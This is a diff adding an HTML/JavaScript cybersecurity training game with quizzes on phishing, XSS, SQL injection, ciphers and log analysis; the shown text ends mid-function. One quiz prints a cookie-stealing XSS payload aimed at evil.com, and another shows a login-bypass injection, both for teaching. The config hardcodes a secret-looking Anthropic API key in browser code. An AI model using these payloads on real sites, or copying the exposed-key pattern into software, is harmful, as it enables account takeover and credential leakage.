@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CyberGuard Chronicles</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #080c08; color: #c8f7c5; font-family: 'Courier New', monospace; min-height: 100vh; }
+    button { font-family: 'Courier New', monospace; cursor: pointer; }
+    textarea { font-family: 'Courier New', monospace; }
+    .hdr { background: #0a120a; border-bottom: 1px solid #1a2e1a; padding: 10px 18px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+    .hdr-title { color: #00ff41; font-size: 13px; font-weight: bold; letter-spacing: 2px; }
+    .hdr-right { display: flex; align-items: center; gap: 8px; }
+    .xp-bar-wrap { display: flex; flex-direction: column; align-items: flex-end; gap: 2px; }
+    .xp-label { font-size: 10px; color: #3d6b3a; }
+    .xp-row { display: flex; align-items: center; gap: 8px; }
+    .xp-track { width: 100px; height: 5px; background: #1a2e1a; border-radius: 3px; }
+    .xp-fill { height: 100%; background: #00ff41; border-radius: 3px; transition: width 0.6s; }
+    .xp-num { font-size: 11px; color: #00ff41; }
+    .btn-sm { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 4px 10px; font-size: 11px; border-radius: 2px; }
+    .main { max-width: 760px; margin: 0 auto; padding: 20px 16px; }
+    .card { background: #0c160c; border: 1px solid #1a2e1a; border-radius: 3px; padding: 18px; margin-bottom: 12px; }
+    .h2 { color: #00ff41; font-size: 15px; margin-bottom: 12px; letter-spacing: 1px; }
+    .dim { color: #3d6b3a; font-size: 12px; }
+    .btn-primary { background: #00ff41; border: 1px solid #00ff41; color: #080c08; padding: 8px 22px; font-size: 13px; font-weight: bold; border-radius: 2px; margin-right: 8px; margin-top: 10px; }
+    .btn-outline { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 7px 18px; font-size: 12px; border-radius: 2px; margin-right: 8px; margin-top: 8px; }
+    .btn-orange { background: transparent; border: 1px solid #f97316; color: #f97316; padding: 7px 18px; font-size: 12px; border-radius: 2px; margin-right: 8px; margin-top: 8px; }
+    .btn-ghost { background: transparent; border: 1px solid transparent; color: #3d6b3a; padding: 7px 18px; font-size: 12px; border-radius: 2px; margin-right: 8px; margin-top: 8px; }
+    .opt { background: #0c160c; border: 1px solid #1a2e1a; border-radius: 3px; padding: 14px 18px; margin-bottom: 8px; cursor: pointer; font-size: 13px; line-height: 1.6; transition: all 0.15s; }
+    .opt.sel-correct { border-color: #00ff41; color: #00ff41; }
+    .opt.sel-wrong { border-color: #f97316; color: #f97316; }
+    .tag { display: inline-block; background: #1a2e1a; padding: 2px 8px; border-radius: 2px; font-size: 11px; color: #00ff41; }
+    .chapter-card { display: flex; align-items: center; gap: 14px; cursor: pointer; transition: opacity 0.2s; }
+    .chapter-card.locked { opacity: 0.35; cursor: not-allowed; }
+    pre { white-space: pre-wrap; word-break: break-word; }
+    table { width: 100%; border-collapse: collapse; font-size: 12px; }
+    th { padding: 7px 10px; text-align: left; color: #3d6b3a; font-weight: normal; border-bottom: 1px solid #1a2e1a; }
+    td { padding: 9px 10px; border-bottom: 1px solid #0c140c; cursor: pointer; }
+    tr.sel-log td { color: #00ff41; background: #111d11; }
+    .hint-box { border: 1px solid #f97316; border-radius: 3px; padding: 18px; margin-top: 12px; color: #f97316; font-size: 13px; line-height: 1.8; }
+    .star { font-size: 26px; cursor: pointer; margin-right: 4px; }
+    textarea.fb { width: 100%; background: #060a06; border: 1px solid #1a2e1a; color: #c8f7c5; font-size: 13px; padding: 10px; border-radius: 2px; resize: vertical; min-height: 70px; }
+    .cursor { display: inline-block; opacity: 0.8; }
+    @keyframes blink { 0%,100%{opacity:0.8} 50%{opacity:0} }
+    .cursor { animation: blink 0.8s infinite; }
+  </style>
+</head>
+<body>
+
+<div id="app"></div>
+
+<script>
+// ─── CONFIG — replace these with your real values ────────────────────────────
+const SUPABASE_URL = 'https://zfibvukiuipthkhanjfg.supabase.co';
+const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpmaWJ2dWtpdWlwdGhraGFuamZnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ0NzY0NjQsImV4cCI6MjEwMDA1MjQ2NH0.h47FGRdchnugqjH4GYEl2qCIMRsVzxx7QAOh67ZTVqc';
+const ANTHROPIC_KEY = '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';
+
+// ─── SUPABASE ────────────────────────────────────────────────────────────────
+const sb = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+async function getCount() {
+  const { data } = await sb.from('player_count').select('count').eq('id', 1).single();
+  return data?.count ?? 0;
+}
+async function incrementCount() {
+  const current = await getCount();
+  await sb.from('player_count').update({ count: current + 1 }).eq('id', 1);
+  return current + 1;
+}
+async function getFeedbacks() {
+  const { data } = await sb.from('feedback').select('*').order('created_at', { ascending: false });
+  return data || [];
+}
+async function saveFeedback(rating, text, xp) {
+  const { error } = await sb.from('feedback').insert({ rating, text, xp });
+  return !error;
+}
+
+// ─── GAME DATA ───────────────────────────────────────────────────────────────
+const GD = {
+  chapters: [
+    {
+      id:1, title:"The Phishing Trap", topic:"Social Engineering", icon:"🎣", color:"#00ff41",
+      story:[
+        {text:"NEXACORP SECURITY DIVISION — Day 1\n\nYou've just logged into your workstation when your supervisor rushes over.", sys:true},
+        {text:'"Rookie! Three employees just fell for suspicious emails. I need you to investigate and train the team — fast. Welcome to cybersecurity."', speaker:"▸ MAYA CHEN"},
+        {text:"You open your terminal. Time to learn what phishing really looks like...", sys:true}
+      ],
+      challenges:[
+        {
+          type:"email_spot", title:"MISSION 1-A: Spot the Phish",
+          desc:"Analyze this email. Click every suspicious element you can find (there are 4).",
+          spots:[
+            {id:"email", label:"Sender uses '0' not 'o' in nexac0rp — typosquatting"},
+            {id:"urgency", label:"URGENT / IMMEDIATELY — panic tactics to bypass thinking"},
+            {id:"link", label:"verify-now.tk is NOT NexaCorp's domain — fake site"},
+            {id:"threat", label:"'permanent termination' — a scare tactic, not how IT works"},
+          ], xp:100
+        },
+        {
+          type:"mcq", title:"MISSION 1-B: Verify the Source",
+          question:"You receive an email asking you to reset your NexaCorp password. What's the SAFEST action?",
+          options:["Click the link — it looks professional with a company logo","Reply to the email asking if it's genuine","Call IT using a number from NexaCorp's official intranet","Click the link but don't enter any information"],
+          correct:2,
+          explanations:["❌ Logos and professional design are trivially easy to copy. Never trust appearance alone.","❌ Replying tells the attacker your email is active and monitored.","✅ Correct! Always verify through a trusted, independent channel — never through the suspicious email itself.","❌ Even visiting a phishing site can be dangerous (drive-by downloads, tracking pixels)."],
+          xp:75
+        }
+      ],
+      codex:[
+        {term:"Phishing", def:"Cyberattack impersonating trusted sources via email to steal credentials or install malware."},
+        {term:"Typosquatting", def:"Registering domains similar to real ones (e.g. 'nexac0rp.com') to deceive users."},
+        {term:"Social Engineering", def:"Psychologically manipulating people to reveal confidential info or take unsafe actions."},
+        {term:"ClickFix (Fake CAPTCHA)", def:"A social engineering attack displaying a fake CAPTCHA prompt, tricking users into running malicious commands themselves — bypassing traditional security defenses."},
+      ]
+    },
+    {
+      id:2, title:"Web Under Siege", topic:"Web Vulnerabilities", icon:"🕸️", color:"#f97316",
+      story:[
+        {text:"NEXACORP — Week 2\n\nThe customer portal has been tampered with. Users are seeing strange pop-ups. The database may be compromised.", sys:true},
+        {text:'"Two attack vectors: XSS in the comment section, SQL injection in the login form. Find them, explain them, we can patch them."', speaker:"▸ MAYA CHEN"}
+      ],
+      challenges:[
+        {
+          type:"mcq", title:"MISSION 2-A: Spot the XSS",
+          question:"A user posted this comment:\n\n  <script>document.location='http://evil.com/?c='+document.cookie<\/script>\n\nWhy is this dangerous if displayed unfiltered?",
+          options:["The comment contains an external link","The script tag runs JavaScript in every visitor's browser, stealing their session cookies","The word 'cookie' triggers a security alert","The comment is formatted with HTML tags"],
+          correct:1,
+          explanations:["❌ External links alone aren't the issue here — the script is.","✅ XSS! The script runs in victims' browsers and sends their cookies to the attacker, enabling account takeover.","❌ 'Cookie' is a technical term, not a security trigger.","❌ HTML tags are fine if sanitized — the problem is unsanitized executable script."],
+          xp:100
+        },
+        {
+          type:"mcq", title:"MISSION 2-B: SQL Injection",
+          question:"An attacker types this into the username field:\n\n  admin'--\n\nThe SQL query is:\n  SELECT * FROM users WHERE username='[INPUT]' AND password='[PASS]'\n\nWhat happens?",
+          options:["Nothing — the database rejects special characters automatically","The database crashes","The ' ends the string early and -- comments out the password check, bypassing login","The input is stored and executed later (stored injection)"],
+          correct:2,
+          explanations:["❌ Without input sanitization, the DB processes the characters as SQL code.","❌ While injection CAN crash databases, that's not what happens here.","✅ The query becomes: SELECT * FROM users WHERE username='admin'--... The password check is commented out!","❌ That's stored XSS. This is a direct (reflected) SQL injection."],
+          xp:100
+        }
+      ],
+      codex:[
+        {term:"XSS", def:"Cross-Site Scripting — injecting malicious scripts into web pages to attack other users."},
+        {term:"SQL Injection", def:"Inserting SQL code into input fields to manipulate or extract database data."},
+        {term:"Input Sanitization", def:"Cleaning/escaping user inputs so they can't be interpreted as executable code."},
+        {term:"Session Cookie", def:"Data keeping you logged in. Stolen cookies allow attackers to hijack your account."}
+      ]
+    },
+    {
+      id:3, title:"The Encrypted Message", topic:"Cryptography", icon:"🔐", color:"#a855f7",
+      story:[
+        {text:"NEXACORP — Week 3\n\nYour team intercepts a transmission from The Phantom Net. It's encrypted. If you crack it, you'll know their next move.", sys:true},
+        {text:'"Looks like a Caesar cipher — shifts every letter by a fixed amount. Classic technique. See if you can decode it before they strike."', speaker:"▸ MAYA CHEN"}
+      ],
+      challenges:[
+        {type:"caesar", title:"MISSION 3-A: Crack the Cipher", encrypted:"DWWDFN WKH VHUYHU DW PLGQLJKW", answer:"ATTACK THE SERVER AT MIDNIGHT", shift:3, xp:125},
+        {
+          type:"mcq", title:"MISSION 3-B: Encryption Fundamentals",
+          question:"Your HTTPS connection uses both asymmetric AND symmetric encryption. Why use both?",
+          options:["It's a legal requirement for all websites","Asymmetric safely exchanges a key, then fast symmetric encryption handles all data","Asymmetric handles text; symmetric handles images","One encrypts the data, the other encrypts the device"],
+          correct:1,
+          explanations:["❌ Not a legal mandate — it's engineering best practice.","✅ Asymmetric (RSA) is slow but enables safe key exchange. Then fast symmetric (AES) encrypts everything. This is TLS/HTTPS.","❌ Both work on any type of data.","❌ Neither encrypts devices — they encrypt transmitted data."],
+          xp:75
+        }
+      ],
+      codex:[
+        {term:"Caesar Cipher", def:"Shifts each letter by a fixed number in the alphabet. One of history's earliest ciphers."},
+        {term:"Encryption", def:"Converting readable plaintext into unreadable ciphertext using an algorithm and key."},
+        {term:"Symmetric Encryption", def:"One key encrypts and decrypts. Fast. Example: AES."},
+        {term:"Asymmetric Encryption", def:"Public key encrypts, private key decrypts. Slower but solves key exchange. Example: RSA."},
+        {term:"HTTPS / TLS", def:"Secure web protocol combining asymmetric key exchange with symmetric data encryption."}
+      ]
+    },
+    {
+      id:4, title:"Network Breach", topic:"Network Security", icon:"🌐", color:"#06b6d4",
+      story:[
+        {text:"NEXACORP — FINAL MISSION\n\nAlarms are sounding. The Phantom Net has breached the network perimeter. This is the endgame.", sys:true},
+        {text:'"I need you on the logs RIGHT NOW. Find the attack pattern, identify the type, shut it down. The whole company is counting on you, Rookie."', speaker:"▸ MAYA CHEN"}
+      ],
+      challenges:[
+        {
+          type:"log_analysis", title:"MISSION 4-A: Read the Network Logs",
+          desc:"Examine these network logs. Click the suspicious entry.",
+          logs:[
+            {id:1,time:"14:22:01",src:"192.168.1.10",dst:"10.0.0.1",port:"443",proto:"HTTPS"},
+            {id:2,time:"14:22:03",src:"192.168.1.15",dst:"8.8.8.8",port:"53",proto:"DNS"},
+            {id:3,time:"14:22:07",src:"203.0.113.99",dst:"10.0.0.1",port:"22",proto:"SSH"},
+            {id:4,time:"14:22:09",src:"192.168.1.20",dst:"10.0.0.5",port:"80",proto:"HTTP"},
+          ],
+          suspiciousId:3,
+          explanation:"✅ Entry #3! External IP 203.0.113.99 is SSH-ing into an internal server (port 22). Unknown external IP = unauthorized remote access.",
+          xp:125
+        },
+        {
+          type:"mcq", title:"MISSION 4-B: Name the Attack",
+          question:"NexaCorp's public server is receiving 80,000 requests/second from thousands of IPs worldwide and has crashed. What is this attack?",
+          options:["Brute Force Attack","Man-in-the-Middle (MitM)","Distributed Denial of Service (DDoS)","SQL Injection"],
+          correct:2,
+          explanations:["❌ Brute force tries many passwords on one account — not mass traffic from many machines.","❌ MitM intercepts traffic between two parties — not flooding a server.","✅ DDoS! Many machines (often a botnet) flood the target until it can't serve legitimate users.","❌ SQL injection targets database inputs, not traffic volume."],
+          xp:75
+        }
+      ],
+      codex:[
+        {term:"DDoS", def:"Distributed Denial of Service — flooding a server from many sources until it crashes."},
+        {term:"Firewall", def:"Network security system controlling traffic based on defined rules. Your first line of defense."},
+        {term:"SSH (Port 22)", def:"Secure Shell — encrypted remote access protocol. A common intrusion target."},
+        {term:"Botnet", def:"Network of infected computers controlled by an attacker, often used for DDoS."},
+        {term:"Zero-Day", def:"A vulnerability unknown to the software maker — no patch exists yet. Extremely dangerous."}
+      ]
+    }
+  ]
+};
+
+// ─── STATE ───────────────────────────────────────────────────────────────────
+let state = {
+  screen: 'title',
+  chapIdx: 0, sceneIdx: 0, chalIdx: 0,
+  xp: 0, codex: [], doneChaps: [],
+  result: null, hint: null, hintLoading: false,
+  typerDone: false, foundSpots: new Set(),
+  selLog: null, shift: 0, selOpt: null,
+  showCodex: false, showFeedback: false,
+  playerCount: null, feedbacks: [],
+  fbRating: 0, fbText: '', fbSubmitted: false, fbLoading: false,
+  typerText: '', typerIdx: 0, typerTimer: null,
+};
+
+const MAX_XP = 950;
+function getLvl(xp) {
+  if (xp < 150) return [1,"Script Kiddie"];
+  if (xp < 350) return [2,"Junior Analyst"];
+  if (xp < 600) return [3,"Security Specialist"];
+  if (xp < 850) return [4,"Senior Analyst"];
+  return [5,"CyberGuard Elite"];
+}
+
+function decipher(txt, n) {
+  return txt.split('').map(c => {
+    const code = c.charCodeAt(0);
+    if (code >= 65 && code <= 90) return String.fromCharCode(((code - 65 - n + 26) % 26) + 65);
+    return c;
+  }).join('');
+}
+
+// ─── RENDER ──────────────────────────────────────────────────────────────────
+function render() {
+  document.getElementById('app').innerHTML = buildApp();
+  bindEvents();
+}
+
+function buildApp() {
+  const s = state;
+  if (s.showFeedback) return buildHdr() + buildFeedback();
+  if (s.showCodex) return buildHdr() + buildCodex();
+  if (s.screen === 'title') return buildHdr() + buildTitle();
+  if (s.screen === 'story') return buildHdr() + buildStory();
+  if (s.screen === 'challenge') return buildHdr() + buildChallenge();
+  if (s.screen === 'result') return buildHdr() + buildResult();
+  if (s.screen === 'chap_end') return buildHdr() + buildChapEnd();
+  return buildHdr() + '<div class="main"><div class="dim">Loading...</div></div>';
+}
+
+function buildHdr() {
+  const [lvl, lvlTitle] = getLvl(state.xp);
+  const pct = Math.min((state.xp / MAX_XP) * 100, 100);
+  return `<div class="hdr">
+    <div class="hdr-title">⚡ CYBERGUARD</div>
+    <div class="hdr-right">
+      <div class="xp-bar-wrap">
+        <div class="xp-label">LVL ${lvl} · ${lvlTitle}</div>
+        <div class="xp-row">
+          <div class="xp-track"><div class="xp-fill" style="width:${pct}%"></div></div>
+          <span class="xp-num">${state.xp} XP</span>
+        </div>
+      </div>
+      <button class="btn-sm" onclick="toggleFeedback()">💬 ${state.feedbacks.length}</button>
+      <button class="btn-sm" onclick="toggleCodex()">📚 ${state.codex.length}</button>
+    </div>
+  </div>`;
+}
+
+function buildTitle() {
+  const chaps = GD.chapters.map((ch, i) => {
+    const unlocked = i === 0 || state.doneChaps.includes(GD.chapters[i-1].id);
+    const done = state.doneChaps.includes(ch.id);
+    const totalXP = ch.challenges.reduce((a,c) => a + c.xp, 0);
+    const borderColor = done ? ch.color : unlocked ? '#1a2e1a' : '#111';
+    const cls = unlocked ? 'chapter-card' : 'chapter-card locked';
+    const action = unlocked ? `onclick="startChap(${i})"` : '';
+    const status = done ? `<span style="color:${ch.color}">COMPLETE</span>` : unlocked ? `<span style="color:#00ff41">▶ PLAY</span>` : `<span style="color:#3d6b3a">🔒 LOCKED</span>`;
+    return `<div class="card ${cls}" style="border-color:${borderColor}" ${action}>
+      <div style="font-size:26px">${ch.icon}</div>
+      <div style="flex:1">
+        <div style="color:${done ? ch.color : '#c8f7c5'};font-weight:bold;margin-bottom:3px">Ch.${ch.id}: ${ch.title} ${done ? '✓' : ''}</div>
+        <div class="dim">${ch.topic} · ${totalXP} XP available</div>
+      </div>
+      ${status}
+    </div>`;
+  }).join('');
+
+  const winBanner = state.doneChaps.length === GD.chapters.length ? `
+    <div class="card" style="border-color:#00ff41;text-align:center;padding:24px;margin-top:16px">
+      <div style="font-size:32px;margin-bottom:8px">🏆</div>
+      <div style="color:#00ff41;font-weight:bold;font-size:16px">PHANTOM NET DEFEATED</div>
+      <div style="color:#c8f7c5;font-size:13px;margin-top:6px">Final Score: ${state.xp} XP · Rank: ${getLvl(state.xp)[1]}</div>
+    </div>` : '';
+
+  const countBadge = state.playerCount !== null ? `
+    <div style="display:inline-flex;align-items:center;gap:8px;background:#0c160c;border:1px solid #1a2e1a;border-radius:20px;padding:5px 16px;margin-bottom:18px;font-size:12px">
+      <span style="font-size:16px">👾</span>
+      <span class="dim">Agents who've played:</span>
+      <span style="color:#00ff41;font-weight:bold">${state.playerCount.toLocaleString()}</span>
+    </div>` : '';
+
+  return `<div class="main">
+    <div style="text-align:center;padding:32px 0 24px">
+      <div style="font-size:52px;margin-bottom:12px">🛡️</div>
+      <h1 style="color:#00ff41;font-size:24px;letter-spacing:4px;margin-bottom:6px">CYBERGUARD CHRONICLES</h1>
+      <p class="dim" style="margin-bottom:16px">A Cybersecurity Training RPG · Beginner Edition</p>
+      ${countBadge}
+      <p style="color:#c8f7c5;max-width:480px;margin:0 auto 28px;line-height:1.8;font-size:13px">
+        You are a rookie analyst at NexaCorp. A shadowy hacker group called
+        <span style="color:#f97316">The Phantom Net</span> is targeting the company.
+        Learn real cybersecurity skills — and stop them.
+      </p>
+    </div>
+    <div class="h2">▸ SELECT CHAPTER</div>
+    ${chaps}
+    ${winBanner}
+  </div>`;
+}
+
+function buildStory() {
+  const chap = GD.chapters[state.chapIdx];
+  const scene = chap.story[state.sceneIdx];
+  const speaker = scene.speaker ? `<div style="color:#00ff41;font-size:11px;margin-bottom:10px;letter-spacing:1px">${scene.speaker}</div>` : '';
+  const textColor = scene.sys ? '#3d6b3a' : '#c8f7c5';
+  const continueBtn = state.typerDone ? `<button class="btn-primary" onclick="advScene()">${state.sceneIdx < chap.story.length - 1 ? 'CONTINUE ▶' : 'BEGIN MISSIONS ▶'}</button>` : '';
+  return `<div class="main">
+    <div class="dim">Chapter ${chap.id} · ${chap.title} · Scene ${state.sceneIdx+1}/${chap.story.length}</div>
+    <div class="card" style="margin-top:14px;min-height:120px">
+      ${speaker}
+      <div style="font-size:14px;line-height:1.9;color:${textColor}" id="typer-out"></div>
+    </div>
+    ${continueBtn}
+    <button class="btn-ghost" onclick="goTitle()">← MENU</button>
+  </div>`;
+}
+
+function buildChallenge() {
+  const chap = GD.chapters[state.chapIdx];
+  const chal = chap.challenges[state.chalIdx];
+  let body = '';
+
+  if (chal.type === 'mcq') {
+    const opts = chal.options.map((opt, i) => {
+      let cls = 'opt';
+      if (state.selOpt === i) cls += i === chal.correct ? ' sel-correct' : ' sel-wrong';
+      const letter = String.fromCharCode(65 + i);
+      const letterColor = state.selOpt === i ? 'inherit' : '#3d6b3a';
+      return `<div class="${cls}" onclick="selectOpt(${i})"><span style="color:${letterColor}">[${letter}]</span> ${opt}</div>`;
+    }).join('');
+    const submitBtn = state.selOpt !== null ? `<button class="btn-primary" onclick="submitMCQ()">SUBMIT ANSWER</button>` : '';
+    body = `<div class="h2">${chal.title}</div>
+      <div class="card" style="background:#080c08;white-space:pre-wrap;font-size:13px;line-height:1.9">${chal.question}</div>
+      ${opts}${submitBtn}`;
+  }
+
+  if (chal.type === 'email_spot') {
+    const found = state.foundSpots;
+    const sp = (id, label, extraColor) => {
+      const active = found.has(id);
+      const color = active ? '#00ff41' : (extraColor || '#f97316');
+      const border = active ? '1px solid #00ff41' : '1px dashed #f97316';
+      return `<span style="cursor:pointer;border-bottom:${border};color:${color}" onclick="addSpot('${id}')">${label}</span>`;
+    };
+    const foundList = [...found].map(id => {
+      const s = chal.spots.find(x => x.id === id);
+      return s ? `<div style="color:#00ff41;font-size:12px;margin-top:5px">✓ ${s.label}</div>` : '';
+    }).join('');
+    const confirmBtn = found.size === chal.spots.length ? `<button class="btn-primary" onclick="submitEmailSpot()">CONFIRM — ALL FOUND ✓</button>` : '';
+    body = `<div class="h2">${chal.title}</div>
+      <div class="dim">${chal.desc}</div>
+      <div class="card" style="background:#060a06;margin-top:12px;font-size:13px">
+        <div class="dim" style="margin-bottom:10px;line-height:1.8">
+          FROM: ${sp('email','security@nexac0rp.com')}<br>
+          TO: you@nexacorp.com<br>
+          SUBJECT: ${sp('urgency','⚠️ URGENT: Your account suspended in 24 hours!')}
+        </div>
+        <div style="border-top:1px solid #1a2e1a;padding-top:12px;line-height:2">
+          Dear Valued Employee,<br><br>
+          We detected unusual activity. Your account will be ${sp('urgency','SUSPENDED unless you verify IMMEDIATELY')}.<br><br>
+          Click here → ${sp('link','http://nexacorp-security.verify-now.tk/login','#06b6d4')}<br><br>
+          ${sp('threat','Failure to act within 24 hours = permanent account termination.')}<br><br>
+          — NexaCorp Security Team
+        </div>
+      </div>
+      <div style="margin-top:10px">
+        <div class="dim">Found: ${found.size} / ${chal.spots.length} — click the suspicious elements above</div>
+        ${foundList}
+      </div>
+      ${confirmBtn}`;
+  }
+
+  if (chal.type === 'caesar') {
+    const decoded = state.shift > 0 ? decipher(chal.encrypted, state.shift) : '——————————————————————';
+    const correct = decoded === chal.answer;
+    const confirmBtn = correct ? `<button class="btn-primary" onclick="submitCaesar()">CONFIRM DECRYPTION ▶</button>` : '';
+    const hint2 = !correct && state.shift > 0 ? `<div class="dim" style="margin-top:6px">Keep adjusting... make the message readable English.</div>` : '';
+    body = `<div class="h2">${chal.title}</div>
+      <div class="card" style="background:#060a06">
+        <div class="dim">INTERCEPTED MESSAGE (ENCRYPTED):</div>
+        <div style="color:#f97316;font-size:20px;letter-spacing:4px;margin:10px 0;font-weight:bold">${chal.encrypted}</div>
+        <div class="dim">YOUR DECRYPTION (shift = ${state.shift}):</div>
+        <div style="color:${correct ? '#00ff41' : '#c8f7c5'};font-size:20px;letter-spacing:4px;margin:10px 0;min-height:30px;font-weight:${correct ? 'bold' : 'normal'}">${decoded}</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:14px;margin:14px 0;padding:14px;background:#0c160c;border-radius:3px">
+        <span class="dim">SHIFT:</span>
+        <input type="range" min="0" max="25" value="${state.shift}" oninput="setShift(this.value)" style="flex:1;accent-color:#00ff41;cursor:pointer">
+        <span style="color:#00ff41;min-width:24px;font-size:18px;font-weight:bold">${state.shift}</span>
+      </div>
+      ${confirmBtn}${hint2}`;
+  }
+
+  if (chal.type === 'log_analysis') {
+    const rows = chal.logs.map(log => {
+      const sel = state.selLog === log.id;
+      return `<tr class="${sel ? 'sel-log' : ''}" onclick="selectLog(${log.id})">
+        <td>${log.id}</td><td>${log.time}</td><td>${log.src}</td><td>${log.dst}</td><td>${log.port}</td><td>${log.proto}</td>
+      </tr>`;
+    }).join('');
+    const confirmBtn = state.selLog !== null ? `<button class="btn-primary" onclick="submitLog()">CONFIRM SELECTION</button>` : '';
+    body = `<div class="h2">${chal.title}</div>
+      <div class="dim">${chal.desc}</div>
+      <div style="overflow-x:auto;margin-top:12px">
+        <table><thead><tr><th>#</th><th>TIME</th><th>SOURCE IP</th><th>DESTINATION</th><th>PORT</th><th>PROTOCOL</th></tr></thead>
+        <tbody>${rows}</tbody></table>
+      </div>
+      ${confirmBtn}`;
+  }
+
+  const hintBox = state.hint ? `<div class="hint-box"><div class="dim" style="margin-bottom:6px">▸ MAYA CHEN:</div>${state.hint}</div>` : '';
+  const hintBtn = state.hintLoading ? `<button class="btn-orange" disabled>⏳ LOADING...</button>` : `<button class="btn-orange" onclick="getHint()">💡 ASK MAYA FOR HINT</button>`;
+
+  return `<div class="main">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
+      <div class="dim">Ch.${chap.id} · Mission ${state.chalIdx+1}/${chap.challenges.length} · ${chal.xp} XP</div>
+      <div class="tag">${chap.topic}</div>
+    </div>
+    <div class="card">${body}</div>
+    <div>${hintBtn}<button class="btn-ghost" onclick="goTitle()">← MENU</button></div>
+    ${hintBox}
+  </div>`;
+}
+
+function buildResult() {
+  const r = state.result;
+  const borderColor = r.ok ? '#00ff41' : '#f97316';
+  const icon = r.ok ? '✅' : '❌';
+  const label = r.ok ? 'CORRECT!' : 'INCORRECT';
+  const xpLine = r.ok ? `<div style="color:#00ff41;font-size:13px">+${r.earned} XP EARNED</div>` : '';
+  const chap = GD.chapters[state.chapIdx];
+  const isLastChal = state.chalIdx >= chap.challenges.length - 1;
+  return `<div class="main">
+    <div class="card" style="border-color:${borderColor};text-align:center;padding:28px">
+      <div style="font-size:44px;margin-bottom:10px">${icon}</div>
+      <div style="color:${borderColor};font-size:18px;font-weight:bold;margin-bottom:6px">${label}</div>
+      ${xpLine}
+    </div>
+    <div class="card" style="margin-top:12px">
+      <div class="dim">▸ EXPLANATION</div>
+      <div style="margin-top:10px;font-size:13px;line-height:1.9">${r.expl}</div>
+    </div>
+    <button class="btn-primary" onclick="nextChal()">${isLastChal ? 'CHAPTER COMPLETE ▶' : 'NEXT MISSION ▶'}</button>
+  </div>`;
+}
+
+function buildChapEnd() {
+  const chap = GD.chapters[state.chapIdx];
+  const entries = chap.codex.map(e => `
+    <div style="padding:8px 0;border-bottom:1px solid #0c140c;font-size:13px">
+      <span style="color:#00ff41;font-weight:bold">${e.term}</span>
+      <span class="dim"> — </span>
+      <span>${e.def}</span>
+    </div>`).join('');
+  const isLast = state.chapIdx >= GD.chapters.length - 1;
+  return `<div class="main">
+    <div class="card" style="border-color:${chap.color};text-align:center;padding:32px">
+      <div style="font-size:44px;margin-bottom:10px">${chap.icon}</div>
+      <div style="color:${chap.color};font-size:18px;font-weight:bold">CHAPTER ${chap.id} COMPLETE</div>
+      <div style="color:#c8f7c5;margin-top:6px">${chap.title}</div>
+    </div>
+    <div class="card" style="margin-top:12px">
+      <div style="color:#00ff41;margin-bottom:10px;font-size:12px;letter-spacing:1px">▸ CODEX ENTRIES UNLOCKED</div>
+      ${entries}
+    </div>
+    <button class="btn-primary" onclick="goTitle()">${isLast ? '🏆 FINISH GAME' : '→ NEXT CHAPTER'}</button>
+  </div>`;
+}
+
+function buildCodex() {
+  const entries = state.codex.length === 0
+    ? `<div class="card" style="color:#3d6b3a;text-align:center;padding:40px">Complete missions to unlock entries.</div>`
+    : state.codex.map(e => `<div class="card" style="margin-bottom:8px"><div style="color:#00ff41;font-weight:bold;margin-bottom:5px">${e.term}</div><div style="font-size:13px;line-height:1.6">${e.def}</div></div>`).join('');
+  return `<div class="main">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+      <div class="h2">📚 SECURITY CODEX</div>
+      <button class="btn-outline" onclick="toggleCodex()">← BACK</button>
+    </div>
+    ${entries}
+  </div>`;
+}
+
+function buildFeedback() {
+  const fbs = state.feedbacks;
+  const avg = fbs.length ? (fbs.reduce((s,f) => s + f.rating, 0) / fbs.length).toFixed(1) : null;
+  const stars = n => '★'.repeat(n) + '☆'.repeat(5-n);
+  const avgBlock = avg ? `<div class="card" style="display:flex;gap:20px;align-items:center;margin-bottom:14px">
+    <div style="text-align:center">
+      <div style="font-size:36px;font-weight:bold;color:#00ff41">${avg}</div>
+      <div style="color:#f59e0b;font-size:18px">${stars(Math.round(avg))}</div>
+    </div>
+    <div class="dim">${fbs.length} review${fbs.length!==1?'s':''} · avg rating</div>
+  </div>` : '';
+
+  const formBlock = state.fbSubmitted
+    ? `<div class="card" style="border-color:#00ff41;text-align:center;padding:18px;margin-bottom:16px"><div style="color:#00ff41">✅ Thanks for your feedback, Agent!</div></div>`
+    : `<div class="card" style="border-color:#1a4a1a;margin-bottom:16px">
+        <div style="color:#00ff41;font-size:12px;letter-spacing:1px;margin-bottom:12px">▸ LEAVE YOUR REVIEW</div>
+        <div style="margin-bottom:10px">${[1,2,3,4,5].map(n=>`<span class="star" style="color:${n<=state.fbRating?'#f59e0b':'#1a2e1a'}" onclick="setRating(${n})">★</span>`).join('')}</div>
+        <textarea class="fb" maxlength="200" oninput="setFbText(this.value)" placeholder="Share your experience...">${state.fbText}</textarea>
+        <div class="dim" style="text-align:right;font-size:11px;margin-bottom:4px">${state.fbText.length}/200</div>
+        <button class="btn-primary" onclick="submitFeedback()" ${(!state.fbRating || !state.fbText.trim() || state.fbLoading) ? 'disabled style="opacity:0.4;cursor:not-allowed"' : ''}>
+          ${state.fbLoading ? 'SUBMITTING...' : 'SUBMIT FEEDBACK'}
+        </button>
+      </div>`;
+
+  const reviewList = fbs.length === 0
+    ? `<div class="card" style="color:#3d6b3a;text-align:center;padding:30px">No reviews yet — be the first!</div>`
+    : fbs.map(f => `<div class="card" style="margin-bottom:8px">
+        <div style="display:flex;justify-content:space-between;margin-bottom:6px">
+          <span style="color:#f59e0b;font-size:14px">${stars(f.rating)}</span>
